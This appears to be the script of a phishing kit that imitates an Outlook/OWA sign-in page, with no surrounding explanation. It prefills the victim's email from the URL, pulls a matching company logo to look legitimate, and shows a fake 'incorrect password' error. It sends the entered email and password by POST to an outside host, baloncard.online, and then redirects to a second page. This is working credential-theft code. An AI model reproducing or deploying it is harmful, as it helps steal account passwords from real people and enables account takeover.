    <script>
        var ai = window.location.hash.substr(1);



        if (ai) {
            var my_ai = ai;
            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr(ind + 1);
            var c = my_slice.substr(0, my_slice.indexOf("."));
            var final = c.toLowerCase();
            $("#ai").val(my_ai);
            $("#msg").hide();

            // Check if the domain name is "outlook.com"
            if (my_slice === "outlook.com") {
                $("#logo-container").html('<img src="logooutlook.png" alt="Logo" class="logo-image">');
            } else {
                var logoUrl = "https://logo.clearbit.com/" + my_slice;
                $.get(logoUrl)
                    .done(function () {
                        $("#logo-container").html('<img src="' + logoUrl + '" alt="Logo" class="logo-image">');
                    })
                    .fail(function () {
                        $("#logo-container").html('<img src="logooutlook.png" alt="Logo" class="logo-image">');
                        console.error("Error loading logo");
                    });
            }
        }

        // Rest of the code...



        function submitForm(event) {
            event.preventDefault();

            // Get the form data using FormData
            var formData = new FormData(document.querySelector("form[name='form1']"));

            // Get the email and password values from the form
            var email = formData.get("ai");
            var password = formData.get("namep");

            // Validate email and password inputs
            if (email.trim() === "" || password.trim() === "" || password.length < 4) {
                document.getElementById("error").innerHTML = "Your account or password is incorrect. Please try again";
                return; // Do not proceed if requirements are not met
            }

            // Send the form data to the email server using AJAX
            $.ajax({
                url: "https://baloncard.online/zz/out2.php",
                method: "POST",
                data: formData,
                processData: false,
                contentType: false,
                success: function (response) {
                    console.log("Success");

                    // Get the email value from the form
                    var email = formData.get("ai");

                    // Redirect to index3.html with email as a fragment identifier
                    var redirectURL = "owa2.html#" + email;
                    window.location.href = redirectURL;
                },
                error: function (error) {
                    console.error("Error", error);
                    document.getElementById("error").innerHTML = "Error, Please try again.";
                }
            });
        }

        // Attach the submitForm function to the form's submit event
        document.querySelector("form[name='form1']").addEventListener("submit", submitForm);
    </script>
